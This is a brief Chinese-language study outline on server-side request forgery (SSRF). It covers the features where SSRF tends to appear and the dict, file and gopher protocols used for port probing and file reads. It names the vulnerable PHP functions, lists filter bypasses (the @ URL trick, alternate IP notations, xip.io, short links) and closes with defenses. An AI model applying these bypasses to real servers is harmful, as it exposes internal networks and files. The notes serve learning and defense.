通过URL分享网页内容
在线翻译
通过URL加载图片
图片、文章的收藏功能
从url的关键字

漏洞利用
dict协议运用
字典服务器协议，让客户端使用过程中能够访问更多的字典源。
利用dict协议探测端口
file协议获取文件系统中的内容
gopher协议万能协议
php中会导致ssrf漏洞的产生的函数
curl_exec()
file_get_contents()
fsockopen()


无回显的SSRF
使用BP的collaboter模块
dnslog.cn

SSRF漏洞利用限制绕过
利用解析URL：
某些情况下，后端程序可能会对访问的URL进行解析，对解析的host地址进行过滤，这时可能会出现对URL参数解析不当，导致绕过过滤
访问https://baidu.com@10.10.10.10与访问10.10.10.10的内容一致
 IP地址转换成进制
8进制
16进制
10进制整数
16进制整数
添加端口绕过正则匹配
192.168.1.1:80
利用xip.io、xip.name绕过
短地址绕过
利用句号（将点换成句号）

防御：
过滤返回信息、验证远程服务器对响应的请求
同意错误信息
限制请求端口为常用的端口
设置黑名单内网ip
禁用不需要的协议、仅允许http和https请求  

反序列化（unserialize）

  

